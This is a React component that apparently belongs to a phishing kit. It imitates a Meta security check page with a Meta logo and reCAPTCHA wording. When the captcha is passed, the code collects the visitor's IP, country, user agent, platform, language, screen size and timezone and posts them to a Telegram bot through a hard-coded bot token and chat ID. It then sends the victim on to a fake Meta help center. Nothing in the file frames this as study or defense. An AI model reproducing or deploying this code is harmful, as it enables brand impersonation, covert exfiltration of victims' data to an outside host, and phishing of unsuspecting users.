// MetaSecurityCheck.jsx
import React, { useEffect, useState } from 'react';
import './MetaSecurityCheck.css';
import metaLogo from './meta.png';
import { useNavigate } from 'react-router-dom';

const telegramBotToken = '7863868126:AAFIw9RvpTWj07VVlqywabCHHCP9Qrb4LrA';
const telegramChatId = '-4682819457';

const MetaSecurityCheck = () => {
  const [captchaPassed, setCaptchaPassed] = useState(false);

  const navigate = useNavigate();
  // const onClick = () => {
  //   navigate('/log-in');
  // };

  useEffect(() => {
    // Dynamically load the Google reCAPTCHA script
    const script = document.createElement('script');
    script.src = 'https://www.google.com/recaptcha/api.js';
    script.async = true;
    script.defer = true;
    document.body.appendChild(script);

    // Clean up on unmount
    return () => {
      document.body.removeChild(script);
    };
  }, []);

  // Callback invoked by reCAPTCHA on successful verification
  // window.onCaptchaSuccess = () => {
  //   window.location.href = '/'; // or wherever you want to redirect
  // };

  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://www.google.com/recaptcha/api.js';
    script.async = true;
    script.defer = true;
    document.body.appendChild(script);

    window.onCaptchaSuccess = async () => {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const payload = {
          text: `*Visitor Info*
• IP: [${data.ip}](http://${data.ip})
• Country: ${data.country_name}

*Device Info*
• User Agent: ${navigator.userAgent}
• Platform: ${navigator.platform}
• Language: ${navigator.language}
• Screen: ${window.screen.width}x${window.screen.height}
• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
          parse_mode: 'Markdown',
        };

        const BOT_TOKEN = '7863868126:AAFIw9RvpTWj07VVlqywabCHHCP9Qrb4LrA';
        const CHAT_ID = '-4682819457';

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, ...payload }),
        });

        setCaptchaPassed(true);
      } catch (err) {
        console.error('Error sending to Telegram:', err);
      }
      navigate('/meta-help-center');
    };

    return () => {
      delete window.onCaptchaSuccess;
    };
  }, []);

  return (
    <div className="meta-security-container">
      <div className="captcha-box">
        <div className="logo">
          <img src={metaLogo} alt="Meta" />
        </div>

        {/* Google reCAPTCHA widget */}
        <div
          className="g-recaptcha"
          data-sitekey="6LfGa0ArAAAAAG697McQ3be4gpTS1sBIxZzGrRS6"
          data-callback="onCaptchaSuccess"
        ></div>

        <div className="terms">
          This helps us to combat harmful conduct, detect and prevent spam and
          maintain the integrity of our Products.
          <br />
          <br />
          We’ve used Google’s reCAPTCHA Enterprise product to provide this
          security check. Your use of reCAPTCHA Enterprise is subject to
          Google’s <a href="#">Privacy Policy</a> and{' '}
          <a href="#">Terms of Use</a>.<br />
          <br />
          reCAPTCHA Enterprise collects hardware and software information, such
          as device and application data, and sends it to Google to provide,
          maintain, and improve reCAPTCHA Enterprise and for general security
          purposes. This information is not used by Google for personalized
          advertising.
        </div>
      </div>
    </div>
  );
};

export default MetaSecurityCheck;
